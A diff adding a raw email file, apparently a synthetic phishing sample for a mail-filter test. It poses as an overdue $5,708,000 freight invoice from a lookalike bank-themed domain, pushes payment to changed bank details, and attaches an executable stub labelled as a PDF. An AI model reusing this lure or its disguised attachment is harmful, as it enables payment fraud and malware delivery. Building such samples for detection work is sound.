@@ -1,0 +1,73 @@
+From: "Aurora Freight Accounts" <billing@hdfc-kyc-update.link>
+To: Rohan Dawson <rohan.dawson@brightpath-edu.ac.in>
+Subject: Purchase order INV-2025-6257 needs your approval
+Date: Mon, 11 May 2026 00:16:00 +0000
+Message-ID: <178772093950.6.3667724259753959351@hdfc-kyc-update.link>
+Return-Path: <bounce-4816@hdfc-kyc-update.link>
+MIME-Version: 1.0
+X-Mailer: BulkSend 2.1
+Received: from mx1.mail-relay.example (mx1.mail-relay.example [192.0.2.10]) by
+ mx.brightpath-edu.ac.in (Postfix) with ESMTPS id 01E10DCDCA0F for
+ <recipient@brightpath-edu.ac.in>; Mon, 11 May 2026 00:16:00 +0000
+Received: from edge-2.mailcluster.example (edge-2.mailcluster.example
+ [203.0.113.61]) by mx1.mail-relay.example (Postfix) with ESMTPS id
+ 588C36A98764; Mon, 11 May 2026 00:09:32 +0000
+Received: from vps-31.hosting.example (vps-31.hosting.example [198.51.100.7])
+ by edge-2.mailcluster.example (Postfix) with ESMTPS id 732D2E825DED; Mon, 11
+ May 2026 00:03:36 +0000
+Received: from tor-exit-node.example (tor-exit-node.example [192.0.2.201]) by
+ vps-31.hosting.example (Postfix) with ESMTPS id 513528BF15A4; Mon, 11 May
+ 2026 00:02:15 +0000
+Received-SPF: fail (mailfrom) identity=mailfrom; client-ip=192.0.2.201;
+ envelope-from=<bounce@hdfc-kyc-update.link>;
+Authentication-Results: mx.hdfc-kyc-update.link; spf=fail
+ smtp.mailfrom=hdfc-kyc-update.link; dkim=none header.d=hdfc-kyc-update.link;
+ dmarc=fail (p=reject) header.from=hdfc-kyc-update.link
+Content-Type: multipart/mixed; boundary="===============9136546480238487077=="
+
+--===============9136546480238487077==
+Content-Type: multipart/alternative;
+ boundary="===============4088269217294713250=="
+
+--===============4088269217294713250==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Hello Rohan,
+
+Please find attached invoice INV-2025-6257 for $5,708,000, now overdue. Kindly
+review the attached statement and process this payment immediately to avoid
+service interruption.
+
+If the bank details have changed since your last remittance, use the updated
+account information in the attachment.
+
+Regards,
+Ananya Fletcher
+Accounts Receivable, Aurora Freight
+
+--===============4088269217294713250==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body style=3D"font-family:Segoe UI,Arial,sans-serif;font-size:14px;col=
+or:#202124"><p>Hello Rohan,</p><p>Please find attached invoice INV-2025-6257 =
+for $5,708,000, now overdue. Kindly review the attached statement and process=
+ this payment immediately to avoid service interruption.</p><p>If the bank de=
+tails have changed since your last remittance, use the updated account inform=
+ation in the attachment.</p><p>Regards, Ananya Fletcher Accounts Receivable, =
+Aurora Freight</p></body></html>
+
+--===============4088269217294713250==--
+
+--===============9136546480238487077==
+Content-Type: application/pdf
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="statement_INV-2025-6257.pdf"
+MIME-Version: 1.0
+
+TVqQAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFRo
+aXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2Rl
+
+--===============9136546480238487077==--
